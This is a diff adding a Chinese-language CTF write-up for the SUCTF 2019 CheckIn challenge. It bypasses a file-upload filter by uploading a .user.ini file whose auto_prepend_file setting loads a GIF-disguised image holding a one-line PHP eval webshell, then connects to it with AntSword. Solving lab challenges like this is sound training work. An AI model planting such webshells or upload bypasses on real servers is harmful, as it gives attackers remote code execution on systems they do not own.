@@ -513,4 +513,49 @@ O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=conver
 
 - [PHP 序列化（serialize）格式详解](https://www.neatstudio.com/show-161-1.shtml)
 
+## 0x06 [SUCTF 2019]CheckIn
+
+[题目链接](https://buuoj.cn/challenges#[SUCTF%202019]CheckIn)
+
+文件上传题
+
+网站把php文件的[常用后缀名](https://www.guru99.com/what-is-php-first-php-program.html#6)都过滤了，并且把文件中的`<?`内容也给过滤了。考虑用`<script language='php'>@eval($_POST["password"]);</script>`的写法来绕过。
+
+要知道，想利用webshell的话，必须要能够让服务端将你上传的文件当作php文件去解析，而这题过滤了php文件的后缀名，所以我们无法上传一个php文件，而只能上传一个含有php🐎的图片文件。
+
+所以第二个问题就是怎么让服务端将我们上传的图片文件作为php文件去解析。在这种情况下，可以使用apache的`.htaccess`文件设置让服务端将某个文件当作php文件解析。但是这题环境是nginx，所以没有`.htaccess`。再查阅资料可知，`.user.ini`也是一个可以控制php设置的一个特殊文件。所以这题的思路是先上传`.user.ini`文件，设置在php文件中加载接下来要上传的图片文件，然后上传含有php🐎的图片文件。
+
+两个文件内容
+
+`.user.ini`
+
+```
+GIF89a
+auto_prepend_file=zyleo.jpg
+```
+
+`zyleo.jpg`
+
+```php
+GIF89a
+<script language='php'>@eval($_POST["zyleo"]);</script>
+```
+
+上传之后，看到上传目录为`uploads/fb....b2`，其中也有`index.php`，这就是连接webshell的地址
+
+![image-20210824165341337](image-20210824165341337.png "upload")
+
+然后蚁剑连接就行了
+
+`url地址`：`http://8d42f662-e446-4b96-afd8-ab3d2694bfa1.node4.buuoj.cn:81/uploads/fb10500f3a8407c9ec6ac288f25439b2/index.php`
+
+`连接密码`：`zyleo`
+
+![image-20210824165409582](image-20210824165409582.png "Antsword")
+
+### 参考连接：
+
+- [htaccess文件上传拿shell](https://blog.csdn.net/qq_36512966/article/details/72716079?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control)
+- [user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
+
 
